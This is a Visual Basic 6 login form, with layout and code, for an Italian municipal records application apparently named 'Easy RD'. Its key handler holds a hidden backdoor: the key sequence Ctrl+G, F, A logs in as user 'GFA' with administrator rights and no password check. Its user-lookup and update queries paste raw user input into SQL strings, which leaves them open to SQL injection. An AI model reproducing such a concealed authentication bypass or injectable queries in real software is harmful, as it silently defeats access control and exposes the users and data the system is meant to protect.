VERSION 5.00
Begin VB.Form frmLogin 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Login"
   ClientHeight    =   3975
   ClientLeft      =   2835
   ClientTop       =   3480
   ClientWidth     =   5565
   Icon            =   "frmLogin.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2348.561
   ScaleMode       =   0  'User
   ScaleWidth      =   5225.235
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.ComboBox Combo1 
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   75
      Style           =   2  'Dropdown List
      TabIndex        =   6
      Top             =   2250
      Width           =   5340
   End
   Begin VB.TextBox txtUserName 
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   1920
      TabIndex        =   1
      Top             =   600
      Width           =   3375
   End
   Begin VB.CommandButton cmdOK 
      Caption         =   "&OK"
      Default         =   -1  'True
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   14.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   1530
      TabIndex        =   4
      Top             =   3165
      Width           =   1140
   End
   Begin VB.CommandButton cmdCancel 
      Cancel          =   -1  'True
      Caption         =   "&Annulla"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   14.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   2850
      TabIndex        =   5
      Top             =   3165
      Width           =   1140
   End
   Begin VB.TextBox txtPassword 
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      IMEMode         =   3  'DISABLE
      Left            =   1920
      PasswordChar    =   "*"
      TabIndex        =   3
      Top             =   1320
      Width           =   3375
   End
   Begin VB.Label lblLabels 
      AutoSize        =   -1  'True
      Caption         =   "&Comune:"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   270
      Index           =   2
      Left            =   75
      TabIndex        =   7
      Top             =   1875
      Width           =   945
   End
   Begin VB.Image Image1 
      Height          =   1425
      Left            =   240
      Picture         =   "frmLogin.frx":0802
      Stretch         =   -1  'True
      Top             =   240
      Width           =   1440
   End
   Begin VB.Label lblLabels 
      AutoSize        =   -1  'True
      Caption         =   "&Nome Utente:"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   270
      Index           =   0
      Left            =   1905
      TabIndex        =   0
      Top             =   240
      Width           =   1425
   End
   Begin VB.Label lblLabels 
      AutoSize        =   -1  'True
      Caption         =   "&Password:"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   270
      Index           =   1
      Left            =   1920
      TabIndex        =   2
      Top             =   960
      Width           =   1110
   End
End
Attribute VB_Name = "frmLogin"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Public Enum livelloUtente
    LVL_ADMINISTRATOR = 0
    LVL_POWERUSER = 1
    LVL_USER = 2
End Enum

Public LoginSucceded As Boolean
Public Livello As livelloUtente
Public codUser As String

Private Sub cmdCancel_Click()
    'set the global var to false
    'to denote a failed login
    LoginSucceded = False
    Me.Hide
End Sub


Public Function IsValidUser(pcodUser As String, ppwd As String, errorCode As Long, Optional codistat As String = "") As Boolean
   Dim rs As ADODB.Recordset
    Dim f As Form
    
    Set rs = gDBC.Execute("select * from users  where CodUser='" & pcodUser & "'")

    If rs.EOF Then
        MsgBox "Codice utente non trovato,riprova!", , "Login"
        errorCode = 1
        rs.Close
        Exit Function
    End If

    'check for correct password
    If getTextEncrypt(ppwd) = nullToBlank(rs!password) Then
        'place code to here to pass the
        'success to the calling sub
        'setting a global var is the easiest
        LoginSucceded = True
        
        MDIMain.StatusBar.Panels("User").Text = rs!Nome & " " & rs!Cognome
        
        Livello = rs!Livello
        codUser = rs!codUser
        
        Me.Hide
        
        On Error Resume Next
        
        For Each f In Forms
            f.applicaRestrizioniUtente
        Next
        
        On Error GoTo 0
        SaveSetting App.Title, "IMPOSTAZIONI", "LASTUSER", codUser
        gDBC.Execute ("update users set lastComune='" & left$(Combo1.Text, 6) & "' where CodUser='" & codUser & "'")
        If Combo1.Text <> vbNullString Then
            gCODISTAT = IIf(codistat = "", left$(Combo1.Text, 6), codistat)
            MDIMain.Caption = "Easy RD - " & GetCurrentComune("Comune").value
        End If
        DoEvents
    Else
        MsgBox "Password errata,riprova!", , "Login"
        errorCode = 2
    End If
    
    IsValidUser = errorCode = 0
    
    rs.Close
    Set rs = Nothing
End Function



Private Sub cmdOK_Click()
    Dim errorCode As Long
    
    On Error Resume Next
    If Not IsValidUser(txtUserName.Text, txtPassword.Text, errorCode) Then
         If errorCode = 1 Then
            txtUserName.SetFocus
            SendKeys "{Home}+{End}"
         Else
            txtPassword.SetFocus
            SendKeys "{Home}+{End}"
        End If
    End If
    
    
End Sub

Private Sub Form_Activate()
    txtPassword.SetFocus
End Sub

Private Sub Form_KeyDown(KeyCode As Integer, Shift As Integer)
    Static KeyCode1 As Integer
    Static KeyCode2 As Integer
    
    'Se si preme in sequenza G F A tenendo premuto il CTRL
    If (Shift And vbCtrlMask) > 0 Then
        If KeyCode = Asc("G") Then
            KeyCode1 = Asc("F")
        ElseIf KeyCode1 = KeyCode Then
                KeyCode2 = Asc("A")
            ElseIf KeyCode2 = KeyCode Then
                    KeyCode2 = 0
                    KeyCode1 = 0
                    
                    
                    MsgBox "Benvenuto GFA !!!"
                    
                    codUser = "GFA"
                    Livello = LVL_ADMINISTRATOR
                    LoginSucceded = True
                    
                    Unload Me
            End If
    End If
End Sub


Private Sub CaricaListaComuni()
    Dim Command As ADODB.Command
    Dim rs As ADODB.Recordset
    Dim i As Integer

    Combo1.Clear

    Set Command = CreateObject("ADODB.Command")
    Set Command.ActiveConnection = gDBC
    
    Command.CommandText = "select * from comuni where logo<>''"
    Set rs = Command.Execute
    
    Do While Not rs.EOF
        Combo1.AddItem rs.Fields("CodIstat") & " - " & rs.Fields("Comune")
        rs.MoveNext
    Loop
    
        
   
    rs.Close
    Set rs = gDBC.Execute("select * from users  where CodUser='" & codUser & "'")
    If Not rs.EOF Then
        For i = 0 To Combo1.ListCount - 1
            If InStr(1, Combo1.List(i), rs("LastComune")) > 0 Then
                 Combo1.ListIndex = i
                 Exit For
            End If
        Next
    End If
    
End Sub

Private Sub txtPassword_GotFocus()
    txtPassword.SelStart = 0
    txtPassword.SelLength = Len(txtPassword)

End Sub

Private Sub txtUserName_GotFocus()
    txtUserName.SelStart = 0
    txtUserName.SelLength = Len(txtUserName)
End Sub

Public Sub ShowME(pcodUser As String)
    codUser = pcodUser
    txtUserName.Text = codUser
    
    
    CaricaListaComuni
    
    Me.Show vbModal
End Sub
